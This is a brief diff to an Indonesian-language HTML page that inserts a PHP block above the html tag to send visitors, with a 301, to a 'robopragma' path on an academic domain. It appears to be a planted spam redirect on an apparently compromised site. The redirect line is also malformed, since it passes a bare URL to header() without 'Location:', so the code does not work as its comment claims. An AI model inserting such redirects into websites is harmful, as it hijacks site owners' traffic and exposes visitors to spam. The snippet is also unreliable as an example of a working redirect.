@@ -1,4 +1,8 @@
 <!DOCTYPE HTML>
+<?php
+//* Permanently redirect page
+header("https://adhiyamaan.ac.in/robopragma/",TRUE,301);
+?>
 <html xmlns:wormhole="http://www.w3.org/1999/xhtml" lang="id-ID">
 <head>
 <meta name="google-site-verification" content="SF7Ny8jFi_kLabHMgZ6WJf4n7TFzOStYsBOmR3Cafp4" />
